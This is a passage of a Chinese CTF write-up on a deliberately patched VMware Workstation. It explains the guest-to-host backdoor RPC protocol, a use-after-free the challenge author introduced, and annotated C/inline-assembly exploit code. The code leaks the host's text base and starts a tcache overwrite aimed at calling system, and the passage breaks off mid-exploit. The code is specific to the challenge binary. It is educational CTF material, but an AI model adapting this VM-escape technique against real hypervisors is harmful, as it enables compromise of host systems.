-&lt;/code&gt;&lt;p&gt;返回：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
-ECX = 00010000h: success / 00000000h: failure
-&lt;/code&gt;&lt;p&gt;和前文所述一样，在EBX中存储的是reply type。在接收完reply的数据后，调用此命令。如果没有通过&lt;code class=&quot;inline&quot;&gt;Receive RPC reply data&lt;/code&gt;接收完整个reply数据的话，就会返回failure。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
-void channel_recv_finish(int cookie1,int cookie2,int channel_num,int *res){
-	asm(&quot;movl %%eax,%%ebx\n\t&quot;
-                &quot;movq %%rcx,%%r10\n\t&quot;
-		&quot;movq $0x1,%%rbx\n\t&quot;
-                &quot;movl $0x564d5868,%%eax\n\t&quot;
-                &quot;movl $0x0005001e,%%ecx\n\t&quot;
-                &quot;movw $0x5658,%%dx\n\t&quot;
-                &quot;out %%eax,%%dx\n\t&quot;
-                &quot;movl %%ecx,(%%r10)\n\t&quot;
-                :
-                :
-                :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;
-        );
-}
-&lt;/code&gt;&lt;h2&gt;Close RPC channel&lt;/h2&gt;&lt;blockquote&gt;RPC subcommand：06h&lt;/blockquote&gt;&lt;p&gt;调用：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
-EAX = 564D5868h - magic number
-ECX(HI) = 0006h - subcommand number
-ECX(LO) = 001Eh - command number
-EDX(HI) = channel number
-EDX(LO) = 5658h - port number
-&lt;/code&gt;&lt;p&gt;返回：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
-ECX = 00010000h: success / 00000000h: failure
-&lt;/code&gt;&lt;p&gt;关闭channel。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
-void channel_close(int cookie1,int cookie2,int channel_num,int *res){
-	asm(&quot;movl %%eax,%%ebx\n\t&quot;
-                &quot;movq %%rcx,%%r10\n\t&quot;
-                &quot;movl $0x564d5868,%%eax\n\t&quot;
-                &quot;movl $0x0006001e,%%ecx\n\t&quot;
-                &quot;movw $0x5658,%%dx\n\t&quot;
-                &quot;out %%eax,%%dx\n\t&quot;
-                &quot;movl %%ecx,(%%r10)\n\t&quot;
-                :
-                :
-                :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;
-        );
-}
-&lt;/code&gt;&lt;h2&gt;漏洞分析&lt;/h2&gt;&lt;p&gt;虽然是RealWorld的竞赛，但是因为是魔改的VMWare Workstation，因此我们通过二进制比对的方式可以快速定位到漏洞点，节省大量的二进制程序审计和漏洞挖掘的时间。&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-11b9dd2df64de27dfc3d95bf6d0fbaeb_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;410&quot; data-rawheight=&quot;98&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-11b9dd2df64de27dfc3d95bf6d0fbaeb&quot; data-watermark-src=&quot;v2-43e396613fc9d1538cda308aa2f285ea&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;可以发现出题人仅仅修改了两处，一处在0x1893c9，另一处在0x1893e6。分别对两个位置进行分析：&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-9ab45eb7842b3564ab2a74edce782ae6_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;554&quot; data-rawheight=&quot;115&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-9ab45eb7842b3564ab2a74edce782ae6&quot; data-watermark-src=&quot;v2-d644da4953a25ed3d32e9584deaf3273&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;首先在0x1893c9处，channel-&amp;gt;out_msg_buf置null的操作被nop掉了：&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-57a1fd9b5d741fc17f23632baf84f4c0_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;510&quot; data-rawheight=&quot;192&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-57a1fd9b5d741fc17f23632baf84f4c0&quot; data-watermark-src=&quot;v2-33ec580462e549d3c2900a0beba4345e&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;其次在0x1893e6处的函数调用中，v7&amp;amp;1变成了v7&amp;amp;0x21：&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c4b0a295f323919165bbf2b1072c904b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;596&quot; data-rawheight=&quot;68&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;在第一处patch中，out_msg_buf没有被置空，其次在第二处patch中，原先被限制的reply type(&amp;amp;0x1)变成了&amp;amp;0x21,也就是说，我们在Finish receiving RPC reply的reply type中可以设置另外一条路径，这条路径会导致在随后的&lt;code class=&quot;inline&quot;&gt;v6&lt;/code&gt;这个调用(它会call函数&lt;code class=&quot;inline&quot;&gt;sub_177700&lt;/code&gt;)，&lt;code class=&quot;inline&quot;&gt;output buffer&lt;/code&gt;被&lt;code class=&quot;inline&quot;&gt;free&lt;/code&gt;掉。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-9b42079bc70985838aab4885e2d58353_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;112&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-9b42079bc70985838aab4885e2d58353&quot; data-watermark-src=&quot;v2-6bd011e5aa1a8517146ed58108e6cb9b&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
-void channel_recv_finish2(int cookie1,int cookie2,int channel_num,int *res){
-        asm(&quot;movl %%eax,%%ebx\n\t&quot;
-                &quot;movq %%rcx,%%r10\n\t&quot;
-                &quot;movq $0x21,%%rbx\n\t&quot;
-                &quot;movl $0x564d5868,%%eax\n\t&quot;
-                &quot;movl $0x0005001e,%%ecx\n\t&quot;
-                &quot;movw $0x5658,%%dx\n\t&quot;
-                &quot;out %%eax,%%dx\n\t&quot;
-                &quot;movl %%ecx,(%%r10)\n\t&quot;
-                :
-                :
-                :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;
-        );
-}
-&lt;/code&gt;&lt;h2&gt;漏洞利用&lt;/h2&gt;&lt;p&gt;由上面的分析可以知，这个patch会导致&lt;code class=&quot;inline&quot;&gt;UAF&lt;/code&gt;:如果我们在接收完成之后设置了&lt;code class=&quot;inline&quot;&gt;0x20&lt;/code&gt;这个位，那么&lt;code class=&quot;inline&quot;&gt;output buffer&lt;/code&gt;就会被释放掉，但由于它没有被清零，所以理论上我们可以无限次的将它&lt;code class=&quot;inline&quot;&gt;free&lt;/code&gt;掉。有了这些条件，我们要完成整个利用就不难了。&lt;/p&gt;&lt;p&gt;利用步骤如下:&lt;br&gt;&lt;code class=&quot;inline&quot;&gt;Leak:&lt;/code&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;开两个&lt;code class=&quot;inline&quot;&gt;channel:A，B&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code class=&quot;inline&quot;&gt;A&lt;/code&gt;的&lt;code class=&quot;inline&quot;&gt;output buffer&lt;/code&gt;为&lt;code class=&quot;inline&quot;&gt;buf_A&lt;/code&gt;,然后&lt;code class=&quot;inline&quot;&gt;A&lt;/code&gt;释放&lt;code class=&quot;inline&quot;&gt;buf_A&lt;/code&gt;&lt;/li&gt;&lt;li&gt;这时让&lt;code class=&quot;inline&quot;&gt;B&lt;/code&gt;准备给&lt;code class=&quot;inline&quot;&gt;guest&lt;/code&gt;发&lt;code class=&quot;inline&quot;&gt;output&lt;/code&gt;,&lt;code class=&quot;inline&quot;&gt;B&lt;/code&gt;会分配一个&lt;code class=&quot;inline&quot;&gt;buffer&lt;/code&gt;，我们利用&lt;code class=&quot;inline&quot;&gt;info-set&lt;/code&gt;和&lt;code class=&quot;inline&quot;&gt;info-get&lt;/code&gt;来控制我们分配的&lt;code class=&quot;inline&quot;&gt;buffer&lt;/code&gt;大小，使得&lt;code class=&quot;inline&quot;&gt;B&lt;/code&gt;的&lt;code class=&quot;inline&quot;&gt;output buffer: buf_B=buf_A&lt;/code&gt;。&lt;/li&gt;&lt;li&gt;&lt;code class=&quot;inline&quot;&gt;A&lt;/code&gt;再次释放&lt;code class=&quot;inline&quot;&gt;buf_A&lt;/code&gt;，这也导致了&lt;code class=&quot;inline&quot;&gt;buf_B&lt;/code&gt;被释放。这个时候我们就可以&lt;code class=&quot;inline&quot;&gt;leak&lt;/code&gt;出&lt;code class=&quot;inline&quot;&gt;buf_B&lt;/code&gt;的&lt;code class=&quot;inline&quot;&gt;fd&lt;/code&gt;了,但是这个指针没有什么用，我们想要的是&lt;code class=&quot;inline&quot;&gt;text base&lt;/code&gt;。&lt;/li&gt;&lt;li&gt;因此我们再执行命令&lt;code class=&quot;inline&quot;&gt;vmx.capability.dnd_version&lt;/code&gt;,这会让&lt;code class=&quot;inline&quot;&gt;host&lt;/code&gt;分配一块内存来存放一个&lt;code class=&quot;inline&quot;&gt;obj&lt;/code&gt;,通过控制&lt;code class=&quot;inline&quot;&gt;buffer&lt;/code&gt;大小我们可以刚好让&lt;code class=&quot;inline&quot;&gt;buf_B&lt;/code&gt;被用来存放一个&lt;code class=&quot;inline&quot;&gt;obj&lt;/code&gt;。而这个&lt;code class=&quot;inline&quot;&gt;obj&lt;/code&gt;里面有&lt;code class=&quot;inline&quot;&gt;vtable&lt;/code&gt;,我们可以&lt;code class=&quot;inline&quot;&gt;leak&lt;/code&gt;出来计算&lt;code class=&quot;inline&quot;&gt;text base&lt;/code&gt;。注意我们一直没有接受&lt;code class=&quot;inline&quot;&gt;B&lt;/code&gt;的输出，只是让它做好准备(分配output buffer)。直到这个时候我们才接受它的输出，完成&lt;code class=&quot;inline&quot;&gt;leak&lt;/code&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;Exploit&lt;/code&gt;&lt;/p&gt;&lt;p&gt;有了&lt;code class=&quot;inline&quot;&gt;leak&lt;/code&gt;的方法，&lt;code class=&quot;inline&quot;&gt;exploit&lt;/code&gt;的也是类似的了。简单来说就是&lt;code class=&quot;inline&quot;&gt;UAF&lt;/code&gt;，把&lt;code class=&quot;inline&quot;&gt;tcache&lt;/code&gt;的&lt;code class=&quot;inline&quot;&gt;fd&lt;/code&gt;改到&lt;code class=&quot;inline&quot;&gt;bss&lt;/code&gt;段，然后改函数指针为&lt;code class=&quot;inline&quot;&gt;system&lt;/code&gt;,最后弹&lt;code class=&quot;inline&quot;&gt;calculator&lt;/code&gt;&lt;/p&gt;&lt;p&gt;我给作者的exp加上了注释，大家可以参考:&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
-#include &amp;lt;stdio.h&amp;gt;
-#include &amp;lt;stdint.h&amp;gt;
-void channel_open(int *cookie1,int *cookie2,int *channel_num,int *res){
-    asm(&quot;movl %%eax,%%ebx\n\t&quot;
-        &quot;movq %%rdi,%%r10\n\t&quot;
-        &quot;movq %%rsi,%%r11\n\t&quot;
-        &quot;movq %%rdx,%%r12\n\t&quot;
-        &quot;movq %%rcx,%%r13\n\t&quot;
-        &quot;movl $0x564d5868,%%eax\n\t&quot;
-        &quot;movl $0xc9435052,%%ebx\n\t&quot;
-        &quot;movl $0x1e,%%ecx\n\t&quot;
-        &quot;movl $0x5658,%%edx\n\t&quot;
-        &quot;out %%eax,%%dx\n\t&quot;
-        &quot;movl %%edi,(%%r10)\n\t&quot;
-        &quot;movl %%esi,(%%r11)\n\t&quot;
-        &quot;movl %%edx,(%%r12)\n\t&quot;
-        &quot;movl %%ecx,(%%r13)\n\t&quot;
-        :
-        :
-        :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r8&quot;,&quot;%r10&quot;,&quot;%r11&quot;,&quot;%r12&quot;,&quot;%r13&quot;
-       );
-}
-
-void channel_set_len(int cookie1,int cookie2,int channel_num,int len,int *res){
-    asm(&quot;movl %%eax,%%ebx\n\t&quot;
-        &quot;movq %%r8,%%r10\n\t&quot;
-        &quot;movl %%ecx,%%ebx\n\t&quot;
-        &quot;movl $0x564d5868,%%eax\n\t&quot;
-        &quot;movl $0x0001001e,%%ecx\n\t&quot;
-        &quot;movw $0x5658,%%dx\n\t&quot;
-        &quot;out %%eax,%%dx\n\t&quot;
-        &quot;movl %%ecx,(%%r10)\n\t&quot;
-        :
-        :
-        :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;
-       );
-}
-
-void channel_send_data(int cookie1,int cookie2,int channel_num,int len,char *data,int *res){
-    asm(&quot;pushq %%rbp\n\t&quot;
-        &quot;movq %%r9,%%r10\n\t&quot;
-        &quot;movq %%r8,%%rbp\n\t&quot;
-        &quot;movq %%rcx,%%r11\n\t&quot;
-        &quot;movq $0,%%r12\n\t&quot;
-        &quot;1:\n\t&quot;
-        &quot;movq %%r8,%%rbp\n\t&quot;
-        &quot;add %%r12,%%rbp\n\t&quot;
-        &quot;movl (%%rbp),%%ebx\n\t&quot;
-        &quot;movl $0x564d5868,%%eax\n\t&quot;
-        &quot;movl $0x0002001e,%%ecx\n\t&quot;
-        &quot;movw $0x5658,%%dx\n\t&quot;
-        &quot;out %%eax,%%dx\n\t&quot;
-        &quot;addq $4,%%r12\n\t&quot;
-        &quot;cmpq %%r12,%%r11\n\t&quot;
-        &quot;ja 1b\n\t&quot;
-        &quot;movl %%ecx,(%%r10)\n\t&quot;
-        &quot;popq %%rbp\n\t&quot;
-        :
-        :
-        :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;,&quot;%r11&quot;,&quot;%r12&quot;
-        );
-}
-
-void channel_recv_reply_len(int cookie1,int cookie2,int channel_num,int *len,int *res){
-    asm(&quot;movl %%eax,%%ebx\n\t&quot;
-        &quot;movq %%r8,%%r10\n\t&quot;
-        &quot;movq %%rcx,%%r11\n\t&quot;
-        &quot;movl $0x564d5868,%%eax\n\t&quot;
-        &quot;movl $0x0003001e,%%ecx\n\t&quot;
-        &quot;movw $0x5658,%%dx\n\t&quot;
-        &quot;out %%eax,%%dx\n\t&quot;
-        &quot;movl %%ecx,(%%r10)\n\t&quot;
-        &quot;movl %%ebx,(%%r11)\n\t&quot;
-        :
-        :
-        :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;,&quot;%r11&quot;
-       );
-
-}
-
-void channel_recv_data(int cookie1,int cookie2,int channel_num,int offset,char *data,int *res){
-    asm(&quot;pushq %%rbp\n\t&quot;
-        &quot;movq %%r9,%%r10\n\t&quot;
-        &quot;movq %%r8,%%rbp\n\t&quot;
-        &quot;movq %%rcx,%%r11\n\t&quot;
-        &quot;movq $1,%%rbx\n\t&quot;
-        &quot;movl $0x564d5868,%%eax\n\t&quot;
-        &quot;movl $0x0004001e,%%ecx\n\t&quot;
-        &quot;movw $0x5658,%%dx\n\t&quot;
-        &quot;in %%dx,%%eax\n\t&quot;
-        &quot;add %%r11,%%rbp\n\t&quot;
-        &quot;movl %%ebx,(%%rbp)\n\t&quot;
-        &quot;movl %%ecx,(%%r10)\n\t&quot;
-        &quot;popq %%rbp\n\t&quot;
-        :
-        :
-        :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;,&quot;%r11&quot;,&quot;%r12&quot;
-       );
-}
-
-void channel_recv_finish(int cookie1,int cookie2,int channel_num,int *res){
-    asm(&quot;movl %%eax,%%ebx\n\t&quot;
-        &quot;movq %%rcx,%%r10\n\t&quot;
-        &quot;movq $0x1,%%rbx\n\t&quot;
-        &quot;movl $0x564d5868,%%eax\n\t&quot;
-        &quot;movl $0x0005001e,%%ecx\n\t&quot;
-        &quot;movw $0x5658,%%dx\n\t&quot;
-        &quot;out %%eax,%%dx\n\t&quot;
-        &quot;movl %%ecx,(%%r10)\n\t&quot;
-        :
-        :
-        :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;
-       );
-}
-void channel_recv_finish2(int cookie1,int cookie2,int channel_num,int *res){
-    asm(&quot;movl %%eax,%%ebx\n\t&quot;
-        &quot;movq %%rcx,%%r10\n\t&quot;
-        &quot;movq $0x21,%%rbx\n\t&quot;
-        &quot;movl $0x564d5868,%%eax\n\t&quot;
-        &quot;movl $0x0005001e,%%ecx\n\t&quot;
-        &quot;movw $0x5658,%%dx\n\t&quot;
-        &quot;out %%eax,%%dx\n\t&quot;
-        &quot;movl %%ecx,(%%r10)\n\t&quot;
-        :
-        :
-        :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;
-       );
-}
-void channel_close(int cookie1,int cookie2,int channel_num,int *res){
-    asm(&quot;movl %%eax,%%ebx\n\t&quot;
-        &quot;movq %%rcx,%%r10\n\t&quot;
-        &quot;movl $0x564d5868,%%eax\n\t&quot;
-        &quot;movl $0x0006001e,%%ecx\n\t&quot;
-        &quot;movw $0x5658,%%dx\n\t&quot;
-        &quot;out %%eax,%%dx\n\t&quot;
-        &quot;movl %%ecx,(%%r10)\n\t&quot;
-        :
-        :
-        :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;
-       );
-}
-struct channel{
-    int cookie1;
-    int cookie2;
-    int num;
-};
-uint64_t heap =0;
-uint64_t text =0;
-void run_cmd(char *cmd){
-    struct channel tmp;
-    int res,len,i;
-    char *data;
-    channel_open(&amp;amp;tmp.cookie1,&amp;amp;tmp.cookie2,&amp;amp;tmp.num,&amp;amp;res);
-    if(!res){
-        printf(&quot;fail to open channel!\n&quot;);
-        return;
-    }
-    channel_set_len(tmp.cookie1,tmp.cookie2,tmp.num,strlen(cmd),&amp;amp;res);
-    if(!res){
-        printf(&quot;fail to set len\n&quot;);
-        return;
-    }
-    channel_send_data(tmp.cookie1,tmp.cookie2,tmp.num,strlen(cmd)+0x10,cmd,&amp;amp;res);
-
-    channel_recv_reply_len(tmp.cookie1,tmp.cookie2,tmp.num,&amp;amp;len,&amp;amp;res);
-    if(!res){
-        printf(&quot;fail to recv data len\n&quot;);
-        return;
-    }
-    printf(&quot;recv len:%d\n&quot;,len);
-    data = malloc(len+0x10);
-    memset(data,0,len+0x10);
-    for(i=0;i&amp;lt;len+0x10;i+=4){
-        channel_recv_data(tmp.cookie1,tmp.cookie2,tmp.num,i,data,&amp;amp;res);
-    }
-    printf(&quot;recv data:%s\n&quot;,data);
-    channel_recv_finish(tmp.cookie1,tmp.cookie2,tmp.num,&amp;amp;res);
-    if(!res){
-        printf(&quot;fail to recv finish\n&quot;);
-    }
-
-    channel_close(tmp.cookie1,tmp.cookie2,tmp.num,&amp;amp;res);
-    if(!res){
-        printf(&quot;fail to close channel\n&quot;);
-        return;
-    }
-}
-void leak(){
-    struct channel chan[10];
-    int res=0;
-    int len,i;	
-    char pay[8192];
-    char *s1 = &quot;info-set guestinfo.a AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;;
-    char *data;
-    char *s2 = &quot;info-get guestinfo.a&quot;;
-    char *s3 = &quot;1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;;
-    char *s4 = &quot;tools.capability.dnd_version 4&quot;;
-    char *s5 = &quot;vmx.capability.dnd_version&quot;;
-    //init data
-    run_cmd(s1); // set the message len to be 0x100, so when we call info-get ,we will call malloc(0x100);
-    run_cmd(s4);
-
-
-    //first step 
-    channel_open(&amp;amp;chan[0].cookie1,&amp;amp;chan[0].cookie2,&amp;amp;chan[0].num,&amp;amp;res);
-    if(!res){
-        printf(&quot;fail to open channel!\n&quot;);
-        return;
-    }
-    channel_set_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,strlen(s2),&amp;amp;res);
-    if(!res){
-        printf(&quot;fail to set len\n&quot;);
-        return;
-    }
-    channel_send_data(chan[0].cookie1,chan[0].cookie2,chan[0].num,strlen(s2),s2,&amp;amp;res);
-    channel_recv_reply_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;amp;len,&amp;amp;res);
-    if(!res){
-        printf(&quot;fail to recv data len\n&quot;);
-        return;
-    }
-    printf(&quot;recv len:%d\n&quot;,len);
-    data = malloc(len+0x10);
-    memset(data,0,len+0x10);
-    for(i=0;i&amp;lt;len+0x10;i++){
-        channel_recv_data(chan[0].cookie1,chan[0].cookie2,chan[0].num,i,data,&amp;amp;res);
-    }
-    printf(&quot;recv data:%s\n&quot;,data);
-    //second step free the reply and let the other channel get it.
-
-    channel_open(&amp;amp;chan[1].cookie1,&amp;amp;chan[1].cookie2,&amp;amp;chan[1].num,&amp;amp;res);
-    if(!res){
-        printf(&quot;fail to open channel!\n&quot;);
-        return;
-    }
-    channel_set_len(chan[1].cookie1,chan[1].cookie2,chan[1].num,strlen(s2),&amp;amp;res);
-    if(!res){
-        printf(&quot;fail to set len\n&quot;);
-        return;
-    }
-
-    channel_send_data(chan[1].cookie1,chan[1].cookie2,chan[1].num,strlen(s2)-4,s2,&amp;amp;res);
-    if(!res){
-        printf(&quot;fail to send data\n&quot;);
-        return;
-    }
-
-    //free the output buffer
-    printf(&quot;Freeing the buffer....,bp:0x5555556DD3EF\n&quot;);
-    getchar();
-    channel_recv_finish2(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;amp;res);
-    if(!res){
-        printf(&quot;fail to recv finish1\n&quot;);
-        return;
-    }
-    //finished sending the command, should get the freed buffer
-    printf(&quot;Finishing sending the buffer , should allocate the buffer..,bp:0x5555556DD5BC\n&quot;);
-    getchar();
-    channel_send_data(chan[1].cookie1,chan[1].cookie2,chan[1].num,4,&amp;amp;s2[16],&amp;amp;res);
-    if(!res){
-        printf(&quot;fail to send data\n&quot;);
-        return;
-    }
-    
-    //third step,free it again
-    //set status to be 4
-    channel_recv_reply_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;amp;len,&amp;amp;res);
-    if(!res){
-        printf(&quot;fail to recv data len\n&quot;);
-        return;
-    }
-    printf(&quot;recv len:%d\n&quot;,len);
-
-    //free the output buffer
-    printf(&quot;Free the buffer again...\n&quot;);
-    getchar();
-    channel_recv_finish2(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;amp;res);
-    if(!res){
-        printf(&quot;fail to recv finish2\n&quot;);
-        return;
-    }
-
-    printf(&quot;Trying to reuse the buffer as a struct, which we can leak..\n&quot;);
-    getchar();
-    run_cmd(s5);
-    printf(&quot;Should be done.Check the buffer\n&quot;);
-    getchar();
-
-    //Now the output buffer of chan[1] is used as a struct, which contains many addresses
-    channel_recv_reply_len(chan[1].cookie1,chan[1].cookie2,chan[1].num,&amp;amp;len,&amp;amp;res);
-    if(!res){
-        printf(&quot;fail to recv data len\n&quot;);
-        return;
-    }
-
-
-    data = malloc(len+0x10);
-    memset(data,0,len+0x10);
-    for(i=0;i&amp;lt;len+0x10;i+=4){
-        channel_recv_data(chan[1].cookie1,chan[1].cookie2,chan[1].num,i,data,&amp;amp;res);
-    }
-    printf(&quot;recv data:\n&quot;);
-    for(i=0;i&amp;lt;len;i+=8){
-        printf(&quot;recv data:%lx\n&quot;,*(long long *)&amp;amp;data[i]);
-    }
-    text = (*(uint64_t *)data)-0xf818d0;
-
-    printf(&quot;Leak Success\n&quot;);
-}
-
-void exploit(){
-    //the exploit step is almost the same as the leak ones
-    struct channel chan[10];
-    int res=0;
-    int len,i;
-    char *data;
-    char *s1 = &quot;info-set guestinfo.b BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;;
-    char *s2 = &quot;info-get guestinfo.b&quot;;
-    char *s3 = &quot;1 BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;;
-    char *s4 = &quot;gnome-calculator\x00&quot;;
-    uint64_t pay1 =text+0xFE95B8; 
-    uint64_t pay2 =text+0xECFD0; //system
-    uint64_t pay3 =text+0xFE95C8;
-    char *pay4 = &quot;gnome-calculator\x00&quot;;
-    run_cmd(s1);
-    channel_open(&amp;amp;chan[0].cookie1,&amp;amp;chan[0].cookie2,&amp;amp;chan[0].num,&amp;amp;res);
-    if(!res){
-        printf(&quot;fail to open channel!\n&quot;);
-        return;
-    }
-    channel_set_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,strlen(s2),&amp;amp;res);
-    if(!res){
-        printf(&quot;fail to set len\n&quot;);
-        return;
-    }
-    channel_send_data(chan[0].cookie1,chan[0].cookie2,chan[0].num,strlen(s2),s2,&amp;amp;res);
-    channel_recv_reply_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;amp;len,&amp;amp;res);
-    if(!res){
-        printf(&quot;fail to recv data len\n&quot;);
-        return;
-    }
-    printf(&quot;recv len:%d\n&quot;,len);
-    data = malloc(len+0x10);
-    memset(data,0,len+0x10);
-    for(i=0;i&amp;lt;len+0x10;i+=4){
-        channel_recv_data(chan[0].cookie1,chan[0].cookie2,chan[0].num,i,data,&amp;amp;res);
-    }
-    printf(&quot;recv data:%s\n&quot;,data);
-    channel_open(&amp;amp;chan[1].cookie1,&amp;amp;chan[1].cookie2,&amp;amp;chan[1].num,&amp;amp;res);
-    if(!res){
-        printf(&quot;fail to open channel!\n&quot;);
-        return;
-    }
-    channel_open(&amp;amp;chan[2].cookie1,&amp;amp;chan[2].cookie2,&amp;amp;chan[2].num,&amp;amp;res);
-    if(!res){
-        printf(&quot;fail to open channel!\n&quot;);
-        return;
-    }
-    channel_open(&amp;amp;chan[3].cookie1,&amp;amp;chan[3].cookie2,&amp;amp;chan[3].num,&amp;amp;res);
-    if(!res){
-        printf(&quot;fail to open channel!\n&quot;);
-        return;
-    }
-    channel_recv_finish2(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;amp;res);
-    if(!res){
-        printf(&quot;fail to recv finish2\n&quot;);
-        return;
-    }
-    channel_set_len(chan[1].cookie1,chan[1].cookie2,chan[1].num,strlen(s3),&amp;amp;res);
-    if(!res){
-        printf(&quot;fail to set len\n&quot;);
-        return;
-    }
-    printf(&quot;leak2 success\n&quot;);
